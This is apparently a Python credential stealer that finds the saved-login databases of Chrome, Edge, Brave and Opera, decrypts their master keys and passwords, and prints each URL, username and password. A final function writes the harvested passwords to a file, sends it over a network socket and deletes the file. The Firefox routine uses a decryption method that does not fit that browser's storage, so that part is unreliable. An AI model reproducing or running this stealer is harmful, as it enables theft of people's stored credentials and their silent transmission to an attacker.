import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil

def get_local_state(browser_name):
    paths = {
        "chrome": os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Local State'),
        "edge": os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data', 'Local State'),
        "brave": os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'BraveSoftware', 'Brave-Browser', 'User Data', 'Local State'),
        "opera": os.path.join(os.environ['USERPROFILE'], 'AppData', 'Roaming', 'Opera Software', 'Opera Stable', 'Local State')
    }
    return paths.get(browser_name.lower())

def get_login_data_path(browser_name):
    paths = {
        "chrome": os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data'),
        "edge": os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data'),
        "brave": os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Login Data'),
        "opera": os.path.join(os.environ['USERPROFILE'], 'AppData', 'Roaming', 'Opera Software', 'Opera Stable', 'Login Data'),
        "firefox": os.path.join(os.environ['APPDATA'], 'Mozilla', 'Firefox', 'Profiles')
    }
    return paths.get(browser_name.lower())

def get_master_key(local_state_path):
    if not os.path.exists(local_state_path):
        return None

    with open(local_state_path, 'r', encoding='utf-8') as f:
        local_state = json.load(f)
    encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
    encrypted_key = encrypted_key[5:]   # Remove DPAPI prefix
    master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return master_key

def decrypt_password(ciphertext, master_key):
    try:
        iv = ciphertext[3:15]
        payload = ciphertext[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_password = cipher.decrypt(payload)[:-16].decode()
        return decrypted_password
    except Exception as e:
        return "Error: " + str(e)

def extract_chromium_based_passwords(browser_name):
    local_state_path = get_local_state(browser_name)
    master_key = get_master_key(local_state_path)
    if not master_key:
        print(f"Could not find local state for {browser_name}.")
        return

    login_data_path = get_login_data_path(browser_name)
    if not os.path.exists(login_data_path):
        print(f"Could not find login data for {browser_name}.")
        return

    shutil.copy2(login_data_path, 'Loginvault.db')
    conn = sqlite3.connect('Loginvault.db')
    cursor = conn.cursor()

    try:
        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
        for row in cursor.fetchall():
            url = row[0]
            username = row[1]
            encrypted_password = row[2]
            decrypted_password = decrypt_password(encrypted_password, master_key)
            print(f'URL: {url}\nUsername: {username}\nPassword: {decrypted_password}\n')
    except Exception as e:
        print(f"Error: {e}")
    finally:
        cursor.close()
        conn.close()
        os.remove('Loginvault.db')

def extract_firefox_passwords():
    profiles_path = get_login_data_path("firefox")
    if not os.path.exists(profiles_path):
        print(f"Could not find profiles path for Firefox.")
        return

    profile = next(os.walk(profiles_path))[1][0]
    login_db_path = os.path.join(profiles_path, profile, 'logins.json')
    if not os.path.exists(login_db_path):
        print(f"Could not find login data for Firefox.")
        return

    with open(login_db_path, 'r') as f:
        logins = json.load(f)["logins"]
        for login in logins:
            url = login['hostname']
            username = win32crypt.CryptUnprotectData(base64.b64decode(login['encryptedUsername']))[1].decode()
            password = win32crypt.CryptUnprotectData(base64.b64decode(login['encryptedPassword']))[1].decode()
            print(f'URL: {url}\nUsername: {username}\nPassword: {password}\n')

# Function to save file and send it over
def save_and_send(passwords, client):
    filename = 'Extracted_Psswd.txt'
    with open(filename, 'w') as f:
        f.write(passwords)

    with open(filename, 'rb') as f:
        client.sendall(f.read())

    os.remove(filename)